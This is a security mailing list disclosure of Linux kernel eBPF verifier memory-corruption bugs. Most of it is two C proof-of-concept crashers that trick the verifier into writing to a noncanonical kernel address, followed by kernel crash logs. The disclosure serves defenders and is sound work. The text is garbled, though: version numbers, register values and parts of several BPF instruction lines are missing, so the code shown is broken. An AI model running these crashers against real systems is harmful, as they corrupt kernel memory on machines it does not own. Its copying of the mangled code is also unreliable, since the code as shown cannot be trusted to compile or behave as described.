  oss-security - Linux >=4.9: eBPF memory corruption bugs            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 21 Dec From: Jann Horn <jannh@...gle.com> To: oss-security@...ts.openwall.com Subject: Linux >=4.9: eBPF memory corruption bugs  Hi!  A few BPF verifier bugs in the Linux kernel, most of which can be used for controlled memory corruption, have been fixed over the last days. One of the bugs was introduced in 4.9, the others were only introduced in  The fixes are in the net tree of the Linux kernel (https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/log/kernel/bpf), but not in Linus' tree yet.  The following bug was introduced in 4.9:  === fixed by "bpf: fix incorrect sign extension in check_alu_op()" === check_alu_op() did not distinguish between BPF_ALU64|BPF_MOV|BPF_K (load 32-bit immediate, sign-extended to 64-bit) and BPF_ALU|BPF_MOV|BPF_K (load 32-bit immediate, zero-padded to 64-bit); it performed sign extension in both cases. Debian assigned for this issue.   The following bugs were introduced in  === fixed by "bpf/verifier: fix bounds calculation on BPF_RSH" === Incorrect signed bounds were being computed for BPF_RSH. If the old upper signed bound was positive and the old lower signed bound was negative, this could cause the new upper signed bound to be too low, leading to security issues.  === fixed by "bpf: fix incorrect tracking of register size truncation" === The BPF verifier did not properly handle register truncation to a smaller size.  The old code first mirrors the clearing of the high 32 bits in the bitwise tristate representation, which is correct. But then, it computes the new arithmetic bounds as the intersection between the old arithmetic bounds and the bounds resulting from the bitwise tristate representation. Therefore, when coerce_reg_to_32() is called on a number with bounds [0xffff'fff8, the verifier computes [0xffff'fff8, 0xffff'ffff] as bounds of the truncated number. This is incorrect: The truncated number could also be in the range [0, 7], and no meaningful arithmetic bounds can be computed in that case apart from the obvious [0, 0xffff'ffff]. Debian assigned for this issue.  === fixed by "bpf: fix 32-bit ALU op verification" === adjust_scalar_min_max_vals() only truncates its inputs and otherwise operates on 64-bit numbers while the BPF interpreter and JIT perform 32-bit arithmetic. This means that the output of e.g. will be incorrect. To test this, you can use the following BPF code:                  BPF_ALU32_IMM(BPF_MUL, BPF_REG_1, 5),         BPF_EXIT_INSN()  The verifier generates the following output, which is incorrect:          0:         0: (b4) (u32) r1 = (u32)         1:         1: (24) (u32) r1 *= (u32) 5         2:         2: (95) exit         R0 !read_ok  === fixed by "bpf: fix missing error return in check_stack_boundary()" === check_stack_boundary() prints an error into the verifier log, but doesn't exit, when a stack pointer doesn't have a known offset. This should be usable to get read+write access to spilled stack pointers.  === fixed by "bpf: force strict alignment checks for stack pointers" === The verifier did not force strict alignment checks for stack pointers, but the tracking of stack spills relies on it; unaligned stack accesses can lead to corruption of spilled registers, which is exploitable.  === fixed by "bpf: don't prune branches when a scalar is replaced with a pointer" === The BPF verifier pruned branches when a scalar is replaced with a pointer, explicitly permitting confusing a pointer into a number (but not the other way around). This is a kernel pointer leak.  === fixed by "bpf: fix integer overflows" === There were various issues related to the limited size of integers used in the verifier:  - `off + size` overflow in __check_map_access()  - `off + reg->off` overflow in check_mem_access()  - `off + reg->var_off.value` overflow or 32-bit truncation of    `reg->var_off.value` in check_mem_access()  - 32-bit truncation in check_stack_boundary()    Crash PoCs for some of these issues are at but since oss-security prefers having PoCs in the mail directly, I've pasted the PoCs below. For the other issues, examples of how to trigger them are in the added BPF selftests. The rest of the mail is just PoC code, so if you're not interested in the PoCs, you can stop reading now.     === PoC for "bpf: fix incorrect sign extension in check_alu_op()" === Here is a crasher that tries to write to a noncanonical address. Note that it is only designed to work on  ====================================== user@...ian:~/bpf_range$ cat crasher_badimm.c #define _GNU_SOURCE #include <err.h> #include <stdint.h> #include <linux/bpf.h> #include <linux/filter.h> #include <stdio.h> #include <unistd.h> #include <sys/syscall.h> #include <asm/unistd_64.h> #include <sys/types.h> #include <sys/socket.h>  /* start from kernel */ #define BPF_EMIT_CALL(FUNC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_JMP | BPF_CALL,            \         .dst_reg = 0,                   \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = (FUNC) }) /* ??? */ #define BPF_MOV32_IMM(DST, IMM)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_MOV | BPF_K,     \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_REG_ARG1    BPF_REG_1 #define BPF_REG_ARG2    BPF_REG_2 #define BPF_REG_ARG3    BPF_REG_3 #define BPF_REG_ARG4    BPF_REG_4 #define BPF_REG_ARG5    BPF_REG_5 #define BPF_PSEUDO_MAP_FD   1 #define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \     ((struct bpf_insn) {                    \         .code  = BPF_LD | BPF_DW | BPF_IMM,     \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = (__u32) (IMM) }),          \     ((struct bpf_insn) {                    \         .code  = 0, /* zero is reserved opcode */   \         .dst_reg = 0,                   \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = ((__u64) (IMM)) >> 32 }) #define BPF_ALU32_IMM(OP, DST, IMM)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_LD_MAP_FD(DST, MAP_FD)              \     BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) #define BPF_ALU32_REG(OP, DST, SRC)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_EXIT_INSN()                     \     ((struct bpf_insn) {                    \         .code  = BPF_JMP | BPF_EXIT,            \         .dst_reg = 0,                   \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \     ((struct bpf_insn) {                    \         .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = OFF,                   \         .imm   = 0 }) #define BPF_REG_FP  BPF_REG_10 #define BPF_MOV64_REG(DST, SRC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_ALU64_IMM(OP, DST, IMM)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_MOV64_REG(DST, SRC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_REG_TMP BPF_REG_8 #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \     ((struct bpf_insn) {                    \         .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = OFF,                   \         .imm   = 0 }) #define BPF_JMP_IMM(OP, DST, IMM, OFF)              \     ((struct bpf_insn) {                    \         .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = OFF,                   \         .imm   = IMM }) #define BPF_MOV64_IMM(DST, IMM)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_ALU64_REG(OP, DST, SRC)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_MOV32_REG(DST, SRC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_MOV | BPF_X,     \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) /* end from kernel */   int bpf_(int cmd, union bpf_attr *attrs) {     return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs)); }  void array_set(int mapfd, uint32_t key, uint32_t value) {     union bpf_attr attr = {         .map_fd = mapfd,         .key    = (uint64_t)&key,         .value  = (uint64_t)&value,         .flags  = BPF_ANY,     };       int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);     if (res)         err(1, "map update elem"); }   int main(void) {     union bpf_attr create_map_attrs = {         .map_type = BPF_MAP_TYPE_ARRAY,         .key_size = 4,         .value_size = 8,         .max_entries = 16     };     int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);     if (mapfd == -1)         err(1, "map create");       array_set(mapfd, 1, 1);      char     struct bpf_insn insns[] = {         BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),          // fill r0 with pointer to map value         BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),         BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack         1),         BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),         BPF_REG_TMP),         BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),         BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),         0), // prepare exit         BPF_EXIT_INSN(), // exit          // r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff         0xffffffff),         // r1 = mistreated as 0         BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),         // r1 = mistreated as 0         BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 28),          // compute noncanonical pointer         BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),          // crash by writing to noncanonical pointer         0xdeadbeef),         BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),          // terminate to make the verifier happy         0),         BPF_EXIT_INSN()     };     union bpf_attr create_prog_attrs = {         .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,         .insn_cnt = sizeof(insns) / sizeof(insns[0]),         .insns = (uint64_t)insns,         .license = (uint64_t)"",         .log_level = 2,         .log_size = sizeof(verifier_log),         .log_buf = (uint64_t)verifier_log     };     int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);     if (progfd == -1) {         perror("prog load");         puts(verifier_log);         return 1;     }     puts("ok so far?");      int socks[2];     if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))         err(1, "socketpair");     if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))         err(1, "setsockopt");     if (write(socks[1], "a", 1) != 1)         err(1, "write");     char c;     if (read(socks[0], &c, 1) != 1)         err(1, "read res");     return 0; } user@...ian:~/bpf_range$ gcc -o crasher_badimm crasher_badimm.c -Wall && ./crasher_badimm ok so far? Segmentation fault ======================================   Here is the resulting crash (note the corrupted heap address in R15):  ====================================== general protection fault: [#6] SMP KASAN Modules linked in: binfmt_misc snd_hda_codec_generic crct10dif_pclmul crc32_pclmul ghash_clmulni_intel snd_hda_intel snd_hda_codec pcbc snd_hda_core qxl snd_hwdep snd_pcm snd_timer ttm aesni_intel snd ppdev drm_kms_helper parport_pc crypto_simd soundcore glue_helper drm parport evdev cryptd sg serio_raw pcspkr virtio_console virtio_balloon button ip_tables x_tables autofs4 ext4 crc16 mbcache jbd2 fscrypto sr_mod cdrom sd_mod ata_generic ehci_pci ata_piix uhci_hcd libata ehci_hcd crc32c_intel mii virtio_pci psmouse usbcore virtio_ring scsi_mod virtio i2c_piix4 floppy CPU: 7 PID: Comm: crasher_badimm Tainted: G    B D          #4 Hardware name: QEMU Standard PC + PIIX, BIOS task: task.stack: RIP: RSP: EFLAGS: RAX: RBX: RCX: RDX: RSI: RDI: RBP: R08: R09: R10: R11: R12: R13: R14: R15: FS:  CS:  DS: ES: CR0: CR2: CR3: CR4: Call Trace:  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ? Code: 00 48 0f bf 43 fa 49 01 c7 0f b6 43 f9 c0 e8 04 0f b6 c0 4c 8d 74 c5 00 4c 89 f7 e8 04 4a 0f 00 4d 8b 36 4c 89 ff e8 79 49 0f 00 <45> 89 37 e9 17 e6 ff ff 48 8d 7b 01 e8 58 47 0f 00 0f b6 43 01 RIP: RSP: ---[ end trace ]--- ======================================     === PoC for "bpf: fix incorrect tracking of register size truncation" === Here is a crasher that uses this to again write to a noncanonical address:   ====================================== #define _GNU_SOURCE #include <err.h> #include <stdint.h> #include <linux/bpf.h> #include <linux/filter.h> #include <stdio.h> #include <unistd.h> #include <sys/syscall.h> #include <asm/unistd_64.h> #include <sys/types.h> #include <sys/socket.h>  /* start from kernel */ #define BPF_EMIT_CALL(FUNC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_JMP | BPF_CALL,            \         .dst_reg = 0,                   \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = (FUNC) }) /* ??? */ #define BPF_MOV32_IMM(DST, IMM)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_MOV | BPF_K,     \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_REG_ARG1    BPF_REG_1 #define BPF_REG_ARG2    BPF_REG_2 #define BPF_REG_ARG3    BPF_REG_3 #define BPF_REG_ARG4    BPF_REG_4 #define BPF_REG_ARG5    BPF_REG_5 #define BPF_PSEUDO_MAP_FD   1 #define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \     ((struct bpf_insn) {                    \         .code  = BPF_LD | BPF_DW | BPF_IMM,     \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = (__u32) (IMM) }),          \     ((struct bpf_insn) {                    \         .code  = 0, /* zero is reserved opcode */   \         .dst_reg = 0,                   \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = ((__u64) (IMM)) >> 32 }) #define BPF_ALU32_IMM(OP, DST, IMM)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_LD_MAP_FD(DST, MAP_FD)              \     BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) #define BPF_ALU32_REG(OP, DST, SRC)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_EXIT_INSN()                     \     ((struct bpf_insn) {                    \         .code  = BPF_JMP | BPF_EXIT,            \         .dst_reg = 0,                   \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \     ((struct bpf_insn) {                    \         .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = OFF,                   \         .imm   = 0 }) #define BPF_REG_FP  BPF_REG_10 #define BPF_MOV64_REG(DST, SRC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_ALU64_IMM(OP, DST, IMM)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_MOV64_REG(DST, SRC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_REG_TMP BPF_REG_8 #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \     ((struct bpf_insn) {                    \         .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = OFF,                   \         .imm   = 0 }) #define BPF_JMP_IMM(OP, DST, IMM, OFF)              \     ((struct bpf_insn) {                    \         .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = OFF,                   \         .imm   = IMM }) #define BPF_MOV64_IMM(DST, IMM)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \         .dst_reg = DST,                 \         .src_reg = 0,                   \         .off   = 0,                 \         .imm   = IMM }) #define BPF_ALU64_REG(OP, DST, SRC)             \     ((struct bpf_insn) {                    \         .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) #define BPF_MOV32_REG(DST, SRC)                 \     ((struct bpf_insn) {                    \         .code  = BPF_ALU | BPF_MOV | BPF_X,     \         .dst_reg = DST,                 \         .src_reg = SRC,                 \         .off   = 0,                 \         .imm   = 0 }) /* end from kernel */   int bpf_(int cmd, union bpf_attr *attrs) {     return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs)); }  void array_set(int mapfd, uint32_t key, uint32_t value) {     union bpf_attr attr = {         .map_fd = mapfd,         .key    = (uint64_t)&key,         .value  = (uint64_t)&value,         .flags  = BPF_ANY,     };       int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);     if (res)         err(1, "map update elem"); }   int main(void) {     union bpf_attr create_map_attrs = {         .map_type = BPF_MAP_TYPE_ARRAY,         .key_size = 4,         .value_size = 8,         .max_entries = 16     };     int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);     if (mapfd == -1)         err(1, "map create");       array_set(mapfd, 1, 1);      char     struct bpf_insn insns[] = {         BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),          // fill r3 with value in range [0x0, 0xf], actually 0x8:         // first load map value pointer...         BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),         BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack         1),         BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),         BPF_REG_TMP),         BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),         BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),         0), // prepare exit         BPF_EXIT_INSN(), // exit          // ... then write, read, mask map value         // (tracing actual values through a map is impossible)         8),         BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_3, 0),         BPF_LDX_MEM(BPF_W, BPF_REG_3, BPF_REG_0, 0),         BPF_ALU64_IMM(BPF_AND, BPF_REG_3, 0xf),          // load while working around the first verifier bug                 BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_1),          // r1 in range [0xffff'fff8,         BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_3),          // load r2=0         0),          // trigger verifier bug:         // visible range: [0xffff'fff8, 0xffff'ffff]         // hidden range: [0, 7]         // actual value: 0         BPF_ALU32_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),          // collapse down: verifier sees 1, actual value 0         BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 31),          // flip: verifier sees 0, actual value 1         BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),         BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, -1),          // r1 = verifier sees 0         BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 60),          // compute noncanonical pointer         BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),          // crash by writing to noncanonical pointer         0xdeadbeef),         BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),          // terminate to make the verifier happy         0),         BPF_EXIT_INSN()     };     union bpf_attr create_prog_attrs = {         .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,         .insn_cnt = sizeof(insns) / sizeof(insns[0]),         .insns = (uint64_t)insns,         .license = (uint64_t)"",         .log_level = 2,         .log_size = sizeof(verifier_log),         .log_buf = (uint64_t)verifier_log     };     int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);     if (progfd == -1) {         perror("prog load");         puts(verifier_log);         return 1;     }     puts("ok so far?");      int socks[2];     if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))         err(1, "socketpair");     if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))         err(1, "setsockopt");     if (write(socks[1], "a", 1) != 1)         err(1, "write");     char c;     if (read(socks[0], &c, 1) != 1)         err(1, "read res");     return 0; } user@...ian:~/bpf_range$ gcc -o crasher_badtrunc crasher_badtrunc.c -Wall && ./crasher_badtrunc ok so far? Segmentation fault ======================================   Here's the resulting crash:  ====================================== [  general protection fault: [#2] SMP KASAN [  Modules linked in: binfmt_misc snd_hda_codec_generic qxl snd_hda_intel snd_hda_codec ttm snd_hda_core drm_kms_helper snd_hwdep crct10dif_pclmul snd_pcm drm crc32_pclmul ghash_clmulni_intel snd_timer pcbc aesni_intel snd crypto_simd evdev glue_helper soundcore ppdev cryptd virtio_balloon sg virtio_console serio_raw parport_pc parport pcspkr button ip_tables x_tables autofs4 ext4 crc16 mbcache jbd2 fscrypto sr_mod sd_mod cdrom ata_generic ehci_pci virtio_pci crc32c_intel ata_piix uhci_hcd psmouse virtio_ring virtio floppy ehci_hcd libata usbcore scsi_mod i2c_piix4 mii [  CPU: 1 PID: Comm: crasher_badtrun Tainted: G    B D          #4 [  Hardware name: QEMU Standard PC + PIIX, BIOS [  task: task.stack: [  RIP: [  RSP: EFLAGS: [  RAX: RBX: RCX: [  RDX: RSI: RDI: [  RBP: R08: R09: [  R10: R11: R12: [  R13: R14: R15: [  FS:  [  CS:  DS: ES: CR0: [  CR2: CR3: CR4: [  Call Trace: [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [   ? [  Code: 00 48 0f bf 43 fa 49 01 c7 0f b6 43 f9 c0 e8 04 0f b6 c0 4c 8d 74 c5 00 4c 89 f7 e8 04 4a 0f 00 4d 8b 36 4c 89 ff e8 79 49 0f 00 <45> 89 37 e9 17 e6 ff ff 48 8d 7b 01 e8 58 47 0f 00 0f b6 43 01 [  RIP: RSP: [  ---[ end trace ]--- ======================================  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      